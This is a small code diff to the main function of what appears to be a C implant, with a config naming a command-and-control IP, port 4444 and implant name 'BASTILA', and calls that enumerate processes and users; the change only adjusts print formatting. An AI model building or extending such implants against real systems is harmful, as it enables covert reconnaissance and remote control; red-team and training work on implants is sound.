@@ -9,12 +9,11 @@ int main(VOID)
 	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA" };
 	printf("CONFIG: %s %d %d %s\n", config.c2ip, config.port, config.sleep_interval, config.implant_name);
 
-	printf("\n===========PROCESSES===========");
+	printf("\n===========PROCESSES===========\n");
 	collect_processes();
 
-	printf("\n===========USERS===========");
+	printf("\n===========USERS===========\n");
 	collect_usergrps();
-	// todo: add groups
 
 	return 0;
 
